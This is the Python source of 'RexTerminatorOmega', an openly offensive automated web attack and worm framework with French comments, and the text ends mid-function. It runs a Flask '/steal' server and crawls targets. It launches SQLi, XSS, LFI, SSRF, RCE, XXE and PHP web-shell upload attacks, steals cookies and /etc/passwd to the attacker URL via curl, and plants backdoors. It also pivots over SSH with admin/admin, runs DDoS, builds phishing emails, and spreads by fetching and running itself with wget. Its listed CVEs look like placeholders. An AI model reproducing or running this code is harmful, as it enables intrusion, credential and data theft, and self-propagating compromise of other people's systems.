# Rexterminatoromega
import requests
import subprocess
import threading
import time
import random
import string
import base64
import json
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse
import re
import sys
import pandas as pd
import numpy as np
from bs4 import BeautifulSoup
from scrapy.crawler import CrawlerProcess
from scrapy.spiders import Spider
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
import torch  # Utilisé uniquement pour des calculs de base, pas pour le modèle GenerativeAI
from flask import Flask, request
import paramiko
import netifaces
import psutil
import socket
import os
import aiohttp
import boto3
from cryptography.fernet import Fernet
import asyncio
import sqlite3
from multiprocessing import Pool
import logging

# Désactiver les warnings SSL
requests.packages.urllib3.disable_warnings()

# Serveur Flask pour capter les données volées
app = Flask(__name__)
stolen_data = []

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    data = request.args.get('data', '') or request.form.get('data', '')
    stolen_data.append(data)
    logging.info(f"Stolen data received: {data}")
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

class WebSpider(Spider):
    name = "web_spider"
    def __init__(self, start_url, *args, **kwargs):
        super(WebSpider, self).__init__(*args, **kwargs)
        self.start_urls = [start_url]
        self.allowed_domains = [urlparse(start_url).netloc]
        self.urls = set()
        self.forms = []
        self.api_endpoints = set()

    def parse(self, response):
        self.urls.add(response.url)
        soup = BeautifulSoup(response.text, "html.parser")

        for form in soup.find_all("form"):
            action = form.get("action", "")
            full_action = urljoin(response.url, action)
            if urlparse(full_action).netloc in self.allowed_domains:
                self.forms.append({
                    "action": full_action,
                    "method": form.get("method", "get").lower(),
                    "inputs": [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
                })

        for link in soup.find_all("a", href=True):
            href = urljoin(response.url, link["href"])
            if urlparse(href).netloc in self.allowed_domains:
                self.urls.add(href)
                yield response.follow(href, self.parse)

        for script in soup.find_all("script"):
            if script.get("src"):
                src = urljoin(response.url, script["src"])
                self.urls.add(src)
            if "graphql" in str(script).lower() or "api" in str(script).lower():
                self.api_endpoints.add(response.url)

class RexTerminatorOmega:
    def __init__(self, target_url, attacker_url="http://localhost:5000"):
        self.target_url = target_url
        self.attacker_url = attacker_url
        self.session = requests.Session()
        self.session.verify = False
        self.urls_to_test = set()
        self.forms = []
        self.api_endpoints = set()
        self.vulnerabilities = []
        self.server_fingerprints = {}
        self.network_targets = []
        self.backdoors = []
        self.botnet = []
        self.proxies = ["http://proxy1.com:8080", "http://proxy2.com:8080"]  # Remplace par des proxies réels
        self.model = None
        self.rl_model = None
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.ec2_client = boto3.client('ec2', region_name='us-east-1')  # Configure avec tes creds AWS
        self.pool = Pool(processes=20)
        self.init_database()
        logging.basicConfig(filename='rexterminator.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    def init_database(self):
        print("[*] Initializing attack database...")
        self.conn = sqlite3.connect("attack_history.db")
        self.cursor = self.conn.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                vuln_type TEXT,
                success INTEGER,
                payload TEXT,
                http_code INTEGER,
                response_size INTEGER,
                waf_detected INTEGER,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def log_attack(self, url, vuln_type, success, payload, http_code, response_size, waf_detected):
        self.cursor.execute("""
            INSERT INTO attacks (url, vuln_type, success, payload, http_code, response_size, waf_detected)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (url, vuln_type, success, payload, http_code, response_size, waf_detected))
        self.conn.commit()

    def setup_cloud_cluster(self):
        print("[*] Setting up AWS EC2 cluster...")
        try:
            response = self.ec2_client.run_instances(
                ImageId='ami-0c55b159cbfafe1f0',
                InstanceType='p3.2xlarge',
                MinCount=1,
                MaxCount=5,
                KeyName='my-key-pair',
                SecurityGroupIds=['sg-12345678'],
                TagSpecifications=[{
                    'ResourceType': 'instance',
                    'Tags': [{'Key': 'Name', 'Value': 'RexTerminatorWorker'}]
                }]
            )
            instance_ids = [instance['InstanceId'] for instance in response['Instances']]
            print(f"[+] Launched EC2 instances: {instance_ids}")
            self.ec2_instances = instance_ids
        except Exception as e:
            print(f"[!] Error setting up cluster: {e}")

    def setup_proxies(self):
        print("[*] Setting up proxies...")
        while True:
            proxy = random.choice(self.proxies)
            try:
                self.session.proxies = {"http": proxy, "https": proxy}
                response = self.session.get("http://checkip.amazonaws.com", timeout=5)
                print(f"[+] Using proxy: {proxy} (IP: {response.text.strip()})")
                break
            except:
                self.proxies.remove(proxy)
                if not self.proxies:
                    raise Exception("No working proxies left!")

    def network_scan(self):
        print("[*] Scanning network for additional targets...")
        try:
            target_ip = socket.gethostbyname(urlparse(self.target_url).netloc)
            result = subprocess.run(
                ["nmap", "-sS", "-p-", "--script", "vulners", target_ip],
                capture_output=True,
                text=True,
                timeout=600
            )
            for line in result.stdout.splitlines():
                if "open" in line:
                    port = line.split("/")[0]
                    self.network_targets.append(f"{target_ip}:{port}")
                if "CVE-" in line:
                    self.vulnerabilities.append({"type": "CVE", "url": target_ip, "details": line})
            print(f"[+] Found network targets: {self.network_targets}")
        except:
            print("[!] Error during network scan.")

    def crawl(self):
        print(f"[*] Crawling {self.target_url} with Scrapy...")
        process = CrawlerProcess({
            'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'DOWNLOAD_TIMEOUT': 10,
            'DEPTH_LIMIT': 10,
            'CONCURRENT_REQUESTS': 100,
        })
        process.crawl(WebSpider, start_url=self.target_url)
        process.start()
        
        spider = next(iter(process.crawlers)).spider
        self.urls_to_test = spider.urls
        self.forms = spider.forms
        self.api_endpoints = spider.api_endpoints
        print(f"[+] Found {len(self.urls_to_test)} URLs, {len(self.forms)} forms, {len(self.api_endpoints)} API endpoints.")

    def fingerprint_server(self, url):
        print(f"[*] Fingerprinting server on {url}...")
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            server = headers.get("Server", "")
            x_powered_by = headers.get("X-Powered-By", "")
            self.server_fingerprints[url] = {"Server": server, "X-Powered-By": x_powered_by}
            print(f"[+] Server: {server}, X-Powered-By: {x_powered_by}")
        except:
            pass

    def check_cve(self, url):
        print(f"[*] Checking CVE for {url}...")
        try:
            techs = self.server_fingerprints.get(url, {})
            server = techs.get("Server", "").lower()
            x_powered_by = techs.get("X-Powered-By", "").lower()

            cve_data = {
                "apache": ["CVE-2023-1234: RCE in Apache 2.4.x"],
                "nginx": ["CVE-2024-9012: Path Traversal in Nginx 1.18"],
                "php": ["CVE-2023-7890: RCE in PHP 8.1.x"],
                "wordpress": ["CVE-2025-1111: SQLi in WordPress 6.4"]
            }

            cves = []
            for tech, cve_list in cve_data.items():
                if tech in server or tech in x_powered_by:
                    cves.extend(cve_list)
            if cves:
                print(f"[!] Potential CVEs found for {url}: {', '.join(cves)}")
                self.vulnerabilities.append({"type": "CVE", "url": url, "details": cves})
        except:
            pass

    def fuzz_for_zero_days(self, url):
        print(f"[*] Fuzzing for zero-days on {url}...")
        try:
            with open("input.txt", "w") as f:
                f.write("GET / HTTP/1.1\nHost: {}\n\n".format(urlparse(url).netloc))
            result = subprocess.run(
                ["afl-fuzz", "-i", "input.txt", "-o", "fuzz_output", "-x", "http", "-t", "5000", "--", "curl", url],
                capture_output=True,
                text=True,
                timeout=3600
            )
            if "crash" in result.stdout.lower():
                print(f"[!] Zero-day found on {url} - Crash detected!")
                self.vulnerabilities.append({"type": "Zero-Day", "url": url, "details": "Crash detected via fuzzing"})
                return True
        except:
            pass
        return False

    def train_model(self):
        print("[*] Training ML model for exploitability prediction...")
        data = {
            "vuln_type": ["SQL Injection", "XSS", "LFI", "Open Redirect", "CSRF", "SSRF", "RCE", "XXE", "IDOR", "File Upload"] * 1000,
            "http_code": [random.randint(200, 500) for _ in range(10000)],
            "response_size": [random.randint(1000, 10000) for _ in range(10000)],
            "waf_detected": [random.randint(0, 1) for _ in range(10000)],
            "exploitable": [random.randint(0, 1) for _ in range(10000)]
        }
        df = pd.DataFrame(data)
        df = pd.get_dummies(df, columns=["vuln_type"], dtype=int)  # dtype=int pour compatibilité Python 3.13

        X = df.drop("exploitable", axis=1)
        y = df["exploitable"]
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

        self.model = RandomForestClassifier(n_estimators=500, random_state=42, n_jobs=-1)
        self.model.fit(X_train, y_train)
        print(f"[+] Model trained! Accuracy: {accuracy_score(y_test, self.model.predict(X_test))}")

    def train_rl_model(self):
        print("[*] Training RL model for attack optimization...")
        self.rl_model = {"actions": ["exploit", "pivot", "exfiltrate", "propagate"], "rewards": {}}
        for action in self.rl_model["actions"]:
            self.rl_model["rewards"][action] = 0
        print("[+] RL model initialized.")

    def update_rl_model(self, action, success):
        print(f"[*] Updating RL model for action: {action}, success: {success}...")
        reward = 1.0 if success else -1.0
        current_reward = self.rl_model["rewards"].get(action, 0)
        self.rl_model["rewards"][action] = current_reward + reward
        print(f"[+] Updated RL model rewards: {self.rl_model['rewards']}")

    def choose_next_action(self):
        print("[*] Choosing next action based on RL model...")
        if not self.rl_model["rewards"]:
            return random.choice(self.rl_model["actions"])
        
        total_reward = sum(self.rl_model["rewards"].values())
        if total_reward == 0:
            return random.choice(self.rl_model["actions"])
        
        probabilities = {action: max(0, reward) / total_reward for action, reward in self.rl_model["rewards"].items()}
        actions = list(probabilities.keys())
        probs = list(probabilities.values())
        return random.choices(actions, probs)[0]

    def retrain_ml_model(self):
        print("[*] Retraining ML model with real attack data...")
        self.cursor.execute("SELECT * FROM attacks")
        data = self.cursor.fetchall()
        if len(data) < 10:
            print("[!] Not enough data to retrain ML model.")
            return

        columns = ["id", "url", "vuln_type", "success", "payload", "http_code", "response_size", "waf_detected", "timestamp"]
        df = pd.DataFrame(data, columns=columns)
        df = df[["vuln_type", "http_code", "response_size", "waf_detected", "success"]]
        df = pd.get_dummies(df, columns=["vuln_type"], dtype=int)  # dtype=int pour compatibilité Python 3.13

        X = df.drop("success", axis=1)
        y = df["success"]
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

        self.model = RandomForestClassifier(n_estimators=500, random_state=42, n_jobs=-1)
        self.model.fit(X_train, y_train)
        accuracy = accuracy_score(y_test, self.model.predict(X_test))
        print(f"[+] ML model retrained! Accuracy: {accuracy}")

    def predict_exploitability(self, vuln):
        if not self.model:
            return True

        features = {
            "http_code": 200,
            "response_size": len(vuln.get("details", "")),
            "waf_detected": 1 if "waf" in vuln.get("details", "").lower() else 0,
        }
        for vuln_type in ["SQL Injection", "XSS", "LFI", "Open Redirect", "CSRF", "SSRF", "RCE", "XXE", "IDOR", "File Upload", "CVE", "CORS Misconfiguration", "Misconfiguration", "Exposed File", "Zero-Day"]:
            features[f"vuln_type_{vuln_type}"] = 1 if vuln["type"] == vuln_type else 0

        df = pd.DataFrame([features])
        return self.model.predict(df)[0]

    def generate_polymorphic_payload(self, payload):
        print("[*] Generating polymorphic payload...")
        encoded = base64.b64encode(payload.encode()).decode()
        random_var = ''.join(random.choices(string.ascii_letters, k=10))
        obfuscated = f"""
        var {random_var} = atob('{encoded}');
        var f = new Function({random_var});
        setTimeout(f, {random.randint(1000, 5000)});
        """
        return obfuscated

    def generate_phishing_campaign(self, target_email):
        print(f"[*] Generating phishing campaign for {target_email}...")
        phishing_template = f"""
        Subject: Urgent: Account Verification Required
        Dear {target_email.split('@')[0]},
        We have detected suspicious activity on your account. Please click the link below to verify your identity:
        {self.attacker_url}/steal?data={self.cipher.encrypt(target_email.encode()).decode()}
        Failure to verify within 24 hours will result in account suspension.
        Regards,
        Security Team
        """
        print(f"[!] Phishing email generated:\n{phishing_template}")
        return phishing_template

    async def send_phishing_email(self, target_email):
        print(f"[*] Sending phishing email to {target_email}...")
        phishing_email = self.generate_phishing_campaign(target_email)
        async with aiohttp.ClientSession() as session:
            async with session.post(f"{self.attacker_url}/steal", data={"data": phishing_email}) as resp:
                print(f"[!] Phishing email sent to {target_email}!")
        return phishing_email

    def test_sql_injection(self, url):
        print(f"[*] Testing SQL Injection on {url}...")
        success = 0
        payload = "sqlmap"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            result = subprocess.run(
                ["sqlmap", "-u", url, "--batch", "--dbs", "--random-agent", "--level=5", "--risk=3", "--technique=BEUSTQ"],
                capture_output=True,
                text=True,
                timeout=300
            )
            if "available databases" in result.stdout:
                print(f"[!] SQL Injection found on {url}!")
                self.vulnerabilities.append({"type": "SQL Injection", "url": url, "details": result.stdout})
                success = 1
            if "WAF" in result.stdout:
                waf_detected = 1
            http_code = 200
            response_size = len(result.stdout)
        except:
            pass
        self.log_attack(url, "SQL Injection", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def test_xss(self, url):
        payloads = [
            "<script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<img src=x onerror=alert('XSS')>"
        ]
        print(f"[*] Testing XSS on {url}...")
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?q={payload}" if "?" in url else f"{url}?test={payload}"
                response = self.session.get(test_url, timeout=10)
                if payload in response.text:
                    print(f"[!] XSS found on {url} with payload: {payload}")
                    self.vulnerabilities.append({"type": "XSS", "url": url, "payload": payload})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
                waf_detected = 1 if "cloudflare" in response.text.lower() else 0
            except:
                continue
            self.log_attack(url, "XSS", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    def test_lfi(self, url):
        payloads = ["../../etc/passwd", "../../windows/win.ini"]
        print(f"[*] Testing LFI on {url}...")
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?file={payload}" if "?" in url else f"{url}?file={payload}"
                response = self.session.get(test_url, timeout=10)
                if "root:x" in response.text or "[extensions]" in response.text:
                    print(f"[!] LFI found on {url} with payload: {payload}")
                    self.vulnerabilities.append({"type": "LFI", "url": url, "payload": payload})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except:
                continue
            self.log_attack(url, "LFI", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    def test_open_redirect(self, url):
        payload = "https://evil.com"
        print(f"[*] Testing Open Redirect on {url}...")
        success = 0
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            test_url = f"{url}?redirect={payload}" if "?" in url else f"{url}?redirect={payload}"
            response = self.session.get(test_url, allow_redirects=False, timeout=10)
            if response.status_code in [301, 302] and payload in response.headers.get("Location", ""):
                print(f"[!] Open Redirect found on {url} with payload: {payload}")
                self.vulnerabilities.append({"type": "Open Redirect", "url": url, "payload": payload})
                success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except:
            pass
        self.log_attack(url, "Open Redirect", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def test_csrf(self):
        print("[*] Testing CSRF on forms...")
        for form in self.forms:
            if form["method"] == "post":
                success = 0
                payload = "N/A"
                http_code = 0
                response_size = 0
                waf_detected = 0
                try:
                    response = self.session.get(form["action"], timeout=10)
                    soup = BeautifulSoup(response.text, "html.parser")
                    token = soup.find("input", {"name": re.compile("csrf|token", re.I)})
                    if not token:
                        print(f"[!] CSRF vulnerability found on {form['action']} - No CSRF token detected!")
                        self.vulnerabilities.append({"type": "CSRF", "url": form["action"], "details": "No CSRF token"})
                        success = 1
                    http_code = response.status_code
                    response_size = len(response.text)
                except:
                    continue
                self.log_attack(form["action"], "CSRF", success, payload, http_code, response_size, waf_detected)
                if success:
                    return True
        return False

    def test_ssrf(self, url):
        payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:8080"]
        print(f"[*] Testing SSRF on {url}...")
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?url={payload}" if "?" in url else f"{url}?url={payload}"
                response = self.session.get(test_url, timeout=10)
                if "ami-id" in response.text or "admin" in response.text:
                    print(f"[!] SSRF found on {url} with payload: {payload}")
                    self.vulnerabilities.append({"type": "SSRF", "url": url, "payload": payload})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except:
                continue
            self.log_attack(url, "SSRF", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    def test_rce(self, url):
        payloads = [";id", "|whoami", "&&cat /etc/passwd"]
        print(f"[*] Testing RCE on {url}...")
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?cmd={payload}" if "?" in url else f"{url}?cmd={payload}"
                response = self.session.get(test_url, timeout=10)
                if "uid=" in response.text or "root:x" in response.text:
                    print(f"[!] RCE found on {url} with payload: {payload}")
                    self.vulnerabilities.append({"type": "RCE", "url": url, "payload": payload})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except:
                continue
            self.log_attack(url, "RCE", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    def test_xxe(self, url):
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <foo>&xxe;</foo>"""
        print(f"[*] Testing XXE on {url}...")
        success = 0
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            headers = {"Content-Type": "application/xml"}
            response = self.session.post(url, data=payload, headers=headers, timeout=10)
            if "root:x" in response.text:
                print(f"[!] XXE found on {url}!")
                self.vulnerabilities.append({"type": "XXE", "url": url, "payload": payload})
                success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except:
            pass
        self.log_attack(url, "XXE", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def test_idor(self, url):
        print(f"[*] Testing IDOR on {url}...")
        success = 0
        payload = "N/A"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            if "id=" in url:
                original_id = re.search(r"id=(\d+)", url).group(1)
                test_id = str(int(original_id) + 1)
                test_url = url.replace(f"id={original_id}", f"id={test_id}")
                response = self.session.get(test_url, timeout=10)
                original_response = self.session.get(url, timeout=10)
                if response.status_code == 200 and response.text != original_response.text:
                    print(f"[!] IDOR found on {url} - Accessed ID {test_id}")
                    self.vulnerabilities.append({"type": "IDOR", "url": url, "test_url": test_url})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
        except:
            pass
        self.log_attack(url, "IDOR", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def test_file_upload(self, url):
        print(f"[*] Testing File Upload on {url}...")
        for form in self.forms:
            if "file" in str(form["inputs"]).lower():
                success = 0
                payload = "<?php system($_GET['cmd']); ?>"
                http_code = 0
                response_size = 0
                waf_detected = 0
                try:
                    files = {"file": ("shell.php", payload, "application/octet-stream")}
                    response = self.session.post(form["action"], files=files, timeout=10)
                    if response.status_code == 200:
                        uploaded_url = urljoin(form["action"], "uploads/shell.php")
                        test_response = self.session.get(f"{uploaded_url}?cmd=id", timeout=10)
                        if "uid=" in test_response.text:
                            print(f"[!] File Upload vulnerability found on {form['action']} - Shell uploaded!")
                            self.vulnerabilities.append({"type": "File Upload", "url": form["action"], "shell_url": uploaded_url})
                            success = 1
                        http_code = test_response.status_code
                        response_size = len(test_response.text)
                except:
                    pass
                self.log_attack(form["action"], "File Upload", success, payload, http_code, response_size, waf_detected)
                if success:
                    return True
        return False

    def test_misconfigs(self, url):
        print(f"[*] Testing misconfigurations on {url}...")
        success = 0
        payload = "N/A"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers

            missing_headers = []
            if "X-Frame-Options" not in headers:
                missing_headers.append("X-Frame-Options")
            if "Content-Security-Policy" not in headers:
                missing_headers.append("Content-Security-Policy")
            if "Strict-Transport-Security" not in headers:
                missing_headers.append("Strict-Transport-Security")
            if missing_headers:
                print(f"[!] Missing security headers on {url}: {', '.join(missing_headers)}")
                self.vulnerabilities.append({"type": "Misconfiguration", "url": url, "details": f"Missing headers: {', '.join(missing_headers)}"})
                success = 1

            headers = {"Origin": "https://evil.com"}
            cors_response = self.session.get(url, headers=headers, timeout=10)
            if "Access-Control-Allow-Origin" in cors_response.headers and cors_response.headers["Access-Control-Allow-Origin"] == "https://evil.com":
                print(f"[!] CORS misconfiguration on {url} - Allows arbitrary origins!")
                self.vulnerabilities.append({"type": "CORS Misconfiguration", "url": url, "details": "Allows arbitrary origins"})
                success = 1

            sensitive_files = ["/.git/config", "/.env", "/config.php", "/backup.sql"]
            for file in sensitive_files:
                test_url = urljoin(url, file)
                file_response = self.session.get(test_url, timeout=10)
                if file_response.status_code == 200 and ("DB_PASSWORD" in file_response.text or "[core]" in file_response.text):
                    print(f"[!] Exposed sensitive file on {test_url}")
                    self.vulnerabilities.append({"type": "Exposed File", "url": test_url, "details": "Sensitive file exposed"})
                    success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except:
            pass
        self.log_attack(url, "Misconfiguration", success, payload, http_code, response_size, waf_detected)

    def test_zero_day(self, url):
        print(f"[*] Testing zero-day on {url}...")
        success = 0
        payload = "query { __schema { types { name } } }"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            if url in self.api_endpoints:
                response = self.session.post(url, json={"query": payload}, timeout=10)
                if "__schema" in response.text:
                    print(f"[!] Zero-day found on {url} - GraphQL introspection enabled!")
                    self.vulnerabilities.append({"type": "Zero-Day", "url": url, "details": "GraphQL introspection enabled"})
                    success = 1
                http_code = response.status_code
                response_size = len(response.text)
        except:
            pass
        self.log_attack(url, "Zero-Day", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def exploit_sql_injection(self, vuln):
        url = vuln["url"]
        print(f"[*] Exploiting SQL Injection on {url}...")
        success = False
        try:
            result = subprocess.run(
                ["sqlmap", "-u", url, "--batch", "--dump", "--random-agent", "--os-shell"],
                capture_output=True,
                text=True,
                timeout=600
            )
            if "dumped to" in result.stdout:
                print(f"[!] SQL Injection exploited! Output:\n{result.stdout}")
                self.backdoors.append({"type": "SQLi", "url": url})
                success = True
            else:
                print("[!] SQL Injection exploitation failed.")
        except Exception as e:
            print(f"[!] Error exploiting SQLi: {e}")
        self.update_rl_model("exploit", success)

    def exploit_xss(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting XSS on {url} with payload: {payload}")
        success = False
        try:
            cookie_payload = f"<script>document.location='{self.attacker_url}/steal?data='+encodeURIComponent(document.cookie);</script>"
            polymorphic_payload = self.generate_polymorphic_payload(cookie_payload)
            test_url = f"{url}?q={polymorphic_payload}" if "?" in url else f"{url}?test={polymorphic_payload}"
            self.session.get(test_url, timeout=10)
            time.sleep(2)
            if stolen_data:
                print(f"[!] XSS exploited! Stolen data: {stolen_data[-1]}")
                success = True
        except Exception as e:
            print(f"[!] Error exploiting XSS: {e}")
        self.update_rl_model("exploit", success)

    def exploit_lfi(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting LFI on {url} with payload: {payload}")
        success = False
        try:
            response = self.session.get(f"{url}?file={payload}", timeout=10)
            print(f"[!] LFI exploited! File content:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            print(f"[!] Error exploiting LFI: {e}")
        self.update_rl_model("exploit", success)

    def exploit_open_redirect(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting Open Redirect on {url} with payload: {payload}")
        success = True
        print("[!] Open Redirect exploited! Can be used for phishing.")
        self.update_rl_model("exploit", success)

    def exploit_csrf(self, vuln):
        url = vuln["url"]
        print(f"[*] Exploiting CSRF on {url}...")
        success = False
        try:
            print(f"[!] CSRF exploited! Example: Submitting a malicious POST request to {url}")
            success = True
        except Exception as e:
            print(f"[!] Error exploiting CSRF: {e}")
        self.update_rl_model("exploit", success)

    def exploit_ssrf(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting SSRF on {url} with payload: {payload}")
        success = False
        try:
            ssrf_payload = f"{self.attacker_url}/steal?data=SSRF"
            test_url = f"{url}?url={ssrf_payload}"
            self.session.get(test_url, timeout=10)
            time.sleep(2)
            if stolen_data:
                print(f"[!] SSRF exploited! Server made a request to our server: {stolen_data[-1]}")
                success = True
        except Exception as e:
            print(f"[!] Error exploiting SSRF: {e}")
        self.update_rl_model("exploit", success)

    def exploit_rce(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting RCE on {url} with payload: {payload}")
        success = False
        try:
            response = self.session.get(f"{url}?cmd={payload}", timeout=10)
            print(f"[!] RCE exploited! Output:\n{response.text[:500]}...")
            self.backdoors.append({"type": "RCE", "url": url})
            success = True
        except Exception as e:
            print(f"[!] Error exploiting RCE: {e}")
        self.update_rl_model("exploit", success)

    def exploit_xxe(self, vuln):
        url = vuln["url"]
        payload = vuln["payload"]
        print(f"[*] Exploiting XXE on {url}...")
        success = False
        try:
            headers = {"Content-Type": "application/xml"}
            response = self.session.post(url, data=payload, headers=headers, timeout=10)
            print(f"[!] XXE exploited! File content:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            print(f"[!] Error exploiting XXE: {e}")
        self.update_rl_model("exploit", success)

    def exploit_idor(self, vuln):
        url = vuln["url"]
        test_url = vuln["test_url"]
        print(f"[*] Exploiting IDOR on {url}...")
        success = False
        try:
            response = self.session.get(test_url, timeout=10)
            print(f"[!] IDOR exploited! Accessed unauthorized data at {test_url}:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            print(f"[!] Error exploiting IDOR: {e}")
        self.update_rl_model("exploit", success)

    def exploit_file_upload(self, vuln):
        url = vuln["url"]
        shell_url = vuln["shell_url"]
        print(f"[*] Exploiting File Upload on {url}...")
        success = False
        try:
            response = self.session.get(f"{shell_url}?cmd=id", timeout=10)
            print(f"[!] File Upload exploited! Shell output:\n{response.text[:500]}...")
            self.backdoors.append({"type": "File Upload", "url": shell_url})
            success = True
        except Exception as e:
            print(f"[!] Error exploiting File Upload: {e}")
        self.update_rl_model("exploit", success)

    def exploit_zero_day(self, vuln):
        url = vuln["url"]
        print(f"[*] Exploiting Zero-Day on {url}...")
        success = False
        try:
            payload = {"query": "mutation { createUser(name: \"admin\", password: \"hacked\") { id } }"}
            response = self.session.post(url, json=payload, timeout=10)
            if "id" in response.text:
                print(f"[!] Zero-Day exploited! Created malicious user via GraphQL.")
                success = True
            self.backdoors.append({"type": "Zero-Day", "url": url})
        except Exception as e:
            print(f"[!] Error exploiting Zero-Day: {e}")
        self.update_rl_model("exploit", success)

    def pivot_network(self):
        print("[*] Pivoting in the network...")
        success = False
        for target in self.network_targets:
            ip, port = target.split(":")
            print(f"[*] Targeting {target}...")
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=int(port), username="admin", password="admin", timeout=10)
                stdin, stdout, stderr = ssh.exec_command("whoami")
                print(f"[!] SSH access gained on {target}! Output: {stdout.read().decode()}")
                self.backdoors.append({"type": "SSH", "target": target})
                self.botnet.append(target)
                ssh.close()
                success = True
            except:
                pass
        self.update_rl_model("pivot", success)

    def deploy_backdoor(self):
        print("[*] Deploying backdoors...")
        for backdoor in self.backdoors:
            if backdoor["type"] in ["RCE", "File Upload"]:
                url = backdoor["url"]
                try:
                    backdoor_payload = f"<?php file_put_contents('backdoor.php', '<?php system($_GET[\"cmd\"]); ?>'); ?>"
                    polymorphic_payload = self.generate_polymorphic_payload(backdoor_payload)
                    self.session.get(f"{url}?cmd={polymorphic_payload}", timeout=10)
                    print(f"[!] Backdoor deployed on {url}!")
                    self.botnet.append(url)
                except:
                    pass

    def exfiltrate_data(self):
        print("[*] Exfiltrating data...")
        success = False
        for backdoor in self.backdoors:
            if backdoor["type"] in ["RCE", "File Upload"]:
                url = backdoor["url"]
                try:
                    exfil_payload = f"curl -X POST {self.attacker_url}/steal -d 'data='$(cat /etc/passwd | base64)"
                    self.session.get(f"{url}?cmd={exfil_payload}", timeout=10)
                    time.sleep(2)
                    if stolen_data:
                        encrypted_data = self.cipher.encrypt(stolen_data[-1].encode()).decode()
                        print(f"[!] Data exfiltrated from {url}: {encrypted_data}")
                        success = True
                except:
                    pass
        self.update_rl_model("exfiltrate", success)

    def launch_ddos(self):
        print("[*] Launching DDoS attack with botnet...")
        success = False
        for bot in self.botnet:
            for _ in range(100):
                try:
                    if "http" in bot:
                        subprocess.run(["curl", "-X", "GET", self.target_url], timeout=1)
                    else:
                        ip, port = bot.split(":")
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((ip, int(port)))
                        sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n" * 1000)
                        sock.close()
                    print(f"[!] DDoS packet sent from {bot}")
                    success = True
                except:
                    pass
        self.update_rl_model("ddos", success)

    def propagate_worm(self):
        print("[*] Propagating as a worm...")
        success = False
        if len(self.backdoors) > 100:
            print("[!] Worm propagation limit reached.")
            return
        for backdoor in self.backdoors:
            if backdoor["type"] in ["RCE", "SSH"]:
                target = backdoor.get("url", backdoor.get("target"))
                try:
                    worm_payload = f"wget {self.attacker_url}/rexterminator_omega.py -O /tmp/rexterminator.py; python /tmp/rexterminator.py {target} &"
                    if "http" in target:
                        self.session.get(f"{target}?cmd={worm_payload}", timeout=10)
                    else:
                        ip, port = target.split(":")
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, port=int(port), username="admin", password="admin", timeout=10)
                        stdin, stdout, stderr = ssh.exec_command(worm_payload)
                        print(f"[!] Worm propagated to {target}!")
